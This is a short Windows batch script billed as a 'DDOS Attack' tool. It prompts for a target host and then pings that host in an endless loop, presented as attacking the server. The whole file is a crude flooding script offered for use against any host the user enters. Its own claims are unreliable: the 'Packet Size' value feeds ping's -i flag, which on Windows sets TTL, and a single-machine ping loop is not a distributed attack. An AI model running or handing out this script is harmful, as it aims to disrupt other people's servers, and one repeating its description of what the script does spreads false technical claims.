@echo off
mode 67,16
title DDOS Attack By IzzatFarhan
color 0b
cls
echo.
echo �����������������������������������������������������������������
echo DDOS With Batchfile By IzzatFarhan
echo �����������������������������������������������������������������
echo.
set /p x=Server-Target:
echo.
echo �����������������������������������������������������������������
ping %x%
echo �����������������������������������������������������������������
@ping.exe 127.0.0.1 -n 5 -w 1000 > nul
goto Next
:Next
echo.
echo.
echo.
set /p m=ip Host:
echo.
set /p n=Packet Size:
echo.
:DDOS
color 0d
echo Attacking Server %m%
ping %m% -i %n% -t >nul
goto DDOS